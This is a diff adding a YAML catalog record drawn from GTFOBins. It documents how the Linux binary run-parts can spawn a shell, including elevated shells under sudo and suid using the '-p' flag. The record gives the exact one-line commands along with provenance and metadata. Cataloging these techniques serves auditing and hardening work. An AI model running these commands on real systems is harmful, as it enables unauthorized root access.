@@ -1,0 +1,93 @@
+id: gtfobins/run-parts/shell/sudo
+type: binary
+platform: linux
+name: run-parts
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: run-parts --new-session --regex '^sh$' /bin
+- template: 'cp /bin/sh /path/to/temp-dir/
+
+    run-parts /path/to/temp-dir/'
+references:
+- https://gtfobins.github.io/gtfobins/run-parts/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        run-parts:
+          functions:
+            shell:
+            - code: run-parts --new-session --regex '^sh$' /bin
+              contexts:
+                sudo: null
+                suid:
+                  code: run-parts --new-session --regex '^sh$' /bin --arg='-p'
+                  shell: false
+                unprivileged: null
+            - code: 'cp /bin/sh /path/to/temp-dir/
+
+                run-parts /path/to/temp-dir/'
+              contexts:
+                sudo: null
+                suid:
+                  code: 'cp /bin/sh /path/to/temp-dir/
+
+                    run-parts /path/to/temp-dir/ --arg=''-p'''
+                  shell: false
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/run-parts/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:feb7e7a999da6b6980982be3f47fe18a65565190a500ae7c2f91206619fafbb8
